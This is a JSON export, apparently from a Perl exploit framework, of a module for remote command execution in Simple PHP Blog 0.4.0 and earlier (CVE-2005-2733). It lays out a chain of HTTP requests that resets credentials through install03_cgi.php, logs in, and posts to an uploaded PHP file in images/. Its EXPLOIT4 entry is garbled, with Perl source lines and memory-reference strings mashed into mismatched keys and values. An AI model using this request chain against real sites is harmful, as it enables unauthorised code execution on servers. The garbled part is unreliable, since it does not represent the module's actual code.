{
   "title" : "Simple PHP Blog Remote Command Execution",
   "platform" : "UNIX",
   "type" : "MSF",
   "description" : "\n\n          This module combines three separate issues within The Simple PHP Blog (<= 0.4.0)\n\n        application to upload arbitrary data and thus execute a shell. The first\n\n        vulnerability exposes the hash file (password.txt) to unauthenticated users.\n\n        The second vulnerability lies within the image upload system provided to\n\n        logged-in users; there is no image validation function in the blogger to\n\n        prevent an authenticated user from uploading any file type. The third\n\n        vulnerability occurs within the blog comment functionality, allowing\n\n        arbitrary files to be deleted.\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "requests" : {
      "EXPLOIT2" : {
         "METHOD" : "POST",
         "PATH" : "install03_cgi.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /install03_cgi.php",
         "PAYLOAD" : "user=yTiyiv&pass=hKCznK",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         }
      },
      "EXPLOIT4" : {
         "HASH(0x26bfd98)" : "VALIDATION",
         "      TEXT   => \\'Sending Exploit #1 Request : [GET] \\',\n" : "      HEADERS      => {\n",
         "PATH" : "images/jGaRx6I187zE0VVs77Kb.php",
         "  CVE => \"CVE-2005-2733\",\n" : "  DESCRIPTION => \"\n",
         "  TITLE => \"Simple PHP Blog Remote Command Execution\",\n" : "\n",
         "METHOD" : "POST",
         "use URI::URL;\n" : "use Data::Dump qw(dump);\n",
         "    my \\$class = ref \\$type || \\$type;\n" : "    my \\$self = { };\n",
         "  MSF_MODULE => \"sphpblog_file_upload\",\n" : "  OSVDB => 19012,\n",
         "sub load {\n" : "    my \\$type  = shift;\n",
         "no warnings \\'experimental\\';\n" : "\n",
         "   };\n" : "\n",
         "use File::Slurp qw(read_file);\n" : "\n",
         "  PLATFORM => \\'UNIX\\',\n" : "  REQUESTS => {\n",
         "   my \\$class = shift;\n" : "   my ( \\$requester, \\$database ) = @_;\n",
         "      PATH   => \\'\\',\n" : "      PAYLOAD      => \\'\\',\n",
         "    },\n" : "  },\n",
         "        TCODE => [\\'200\\'],\n" : "      },\n",
         "Sending Exploit #4 Request : [POST] /images/jGaRx6I187zE0VVs77Kb.php" : "HEADERS",
         "HASH(0x2737d68)" : null,
         "    bless \\$self, \\$class;\n" : "\n",
         "    EXPLOIT1 => {\n" : "      METHOD       => \\'GET\\',\n",
         "# \n" : "\n",
         "      },\n" : "      VALIDATION   => {\n",
         "PAYLOAD" : "hash=Exploits/SPHPBLOG/MSF/SphpblogFileUpload.pm\n",
         "\n" : "TEXT",
         "package SPHPBLOG::MSF::SphpblogFileUpload;\n" : "use lib qw(../../); use parent qw(Exploit);\n",
         "   return \\$class->SUPER::new(\\$requester, \\$database, \\$name, \\$DETECTION, \\$EXPLOIT, @_);\n" : "}\n",
         "    return \\$self;\n" : "}\n",
         "use warnings;\n" : "\n"
      },
      "EXPLOIT3" : {
         "PATH" : "login_cgi.php",
         "METHOD" : "POST",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "user=yTiyiv&pass=hKCznK",
         "TEXT" : "Sending Exploit #3 Request : [POST] /login_cgi.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      },
      "EXPLOIT1" : {
         "HEADERS" : {},
         "PAYLOAD" : "",
         "TEXT" : "Sending Exploit #1 Request : [GET] ",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "",
         "METHOD" : "GET"
      }
   },
   "osvdb" : 19012,
   "detection" : {},
   "informations" : {
      "TYPE" : "MSF",
      "PLATFORM" : "UNIX",
      "MSF_MODULE" : "sphpblog_file_upload",
      "DESCRIPTION" : "\n\n          This module combines three separate issues within The Simple PHP Blog (<= 0.4.0)\n\n        application to upload arbitrary data and thus execute a shell. The first\n\n        vulnerability exposes the hash file (password.txt) to unauthenticated users.\n\n        The second vulnerability lies within the image upload system provided to\n\n        logged-in users; there is no image validation function in the blogger to\n\n        prevent an authenticated user from uploading any file type. The third\n\n        vulnerability occurs within the blog comment functionality, allowing\n\n        arbitrary files to be deleted.\n\n      ",
      "name" : "SphpblogFileUpload",
      "OSVDB" : 19012,
      "REQUESTS" : {
         "EXPLOIT2" : {
            "METHOD" : "POST",
            "PATH" : "install03_cgi.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /install03_cgi.php",
            "PAYLOAD" : "user=yTiyiv&pass=hKCznK",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            }
         },
         "EXPLOIT4" : {
            "HASH(0x26bfd98)" : "VALIDATION",
            "      TEXT   => \\'Sending Exploit #1 Request : [GET] \\',\n" : "      HEADERS      => {\n",
            "PATH" : "images/jGaRx6I187zE0VVs77Kb.php",
            "  CVE => \"CVE-2005-2733\",\n" : "  DESCRIPTION => \"\n",
            "  TITLE => \"Simple PHP Blog Remote Command Execution\",\n" : "\n",
            "METHOD" : "POST",
            "use URI::URL;\n" : "use Data::Dump qw(dump);\n",
            "    my \\$class = ref \\$type || \\$type;\n" : "    my \\$self = { };\n",
            "  MSF_MODULE => \"sphpblog_file_upload\",\n" : "  OSVDB => 19012,\n",
            "sub load {\n" : "    my \\$type  = shift;\n",
            "no warnings \\'experimental\\';\n" : "\n",
            "   };\n" : "\n",
            "use File::Slurp qw(read_file);\n" : "\n",
            "  PLATFORM => \\'UNIX\\',\n" : "  REQUESTS => {\n",
            "   my \\$class = shift;\n" : "   my ( \\$requester, \\$database ) = @_;\n",
            "      PATH   => \\'\\',\n" : "      PAYLOAD      => \\'\\',\n",
            "    },\n" : "  },\n",
            "        TCODE => [\\'200\\'],\n" : "      },\n",
            "Sending Exploit #4 Request : [POST] /images/jGaRx6I187zE0VVs77Kb.php" : "HEADERS",
            "HASH(0x2737d68)" : null,
            "    bless \\$self, \\$class;\n" : "\n",
            "    EXPLOIT1 => {\n" : "      METHOD       => \\'GET\\',\n",
            "# \n" : "\n",
            "      },\n" : "      VALIDATION   => {\n",
            "PAYLOAD" : "hash=Exploits/SPHPBLOG/MSF/SphpblogFileUpload.pm\n",
            "\n" : "TEXT",
            "package SPHPBLOG::MSF::SphpblogFileUpload;\n" : "use lib qw(../../); use parent qw(Exploit);\n",
            "   return \\$class->SUPER::new(\\$requester, \\$database, \\$name, \\$DETECTION, \\$EXPLOIT, @_);\n" : "}\n",
            "    return \\$self;\n" : "}\n",
            "use warnings;\n" : "\n"
         },
         "EXPLOIT3" : {
            "PATH" : "login_cgi.php",
            "METHOD" : "POST",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "user=yTiyiv&pass=hKCznK",
            "TEXT" : "Sending Exploit #3 Request : [POST] /login_cgi.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         },
         "EXPLOIT1" : {
            "HEADERS" : {},
            "PAYLOAD" : "",
            "TEXT" : "Sending Exploit #1 Request : [GET] ",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "",
            "METHOD" : "GET"
         }
      },
      "CVE" : "CVE-2005-2733",
      "TITLE" : "Simple PHP Blog Remote Command Execution"
   },
   "cve" : "CVE-2005-2733",
   "name" : "SphpblogFileUpload",
   "msf_module" : "sphpblog_file_upload"
}
